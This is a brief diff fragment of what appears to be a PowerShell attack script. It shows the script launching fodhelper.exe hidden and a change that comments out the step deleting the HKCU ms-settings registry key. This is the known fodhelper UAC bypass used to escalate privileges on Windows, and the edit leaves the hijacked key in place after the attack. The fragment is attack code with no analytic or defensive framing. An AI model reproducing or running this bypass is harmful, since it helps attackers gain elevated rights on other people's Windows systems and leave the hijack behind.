@@ -10,4 +10,4 @@ Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
 
 #Remove registry structure
 Start-Sleep 3
-Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force
+#Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force
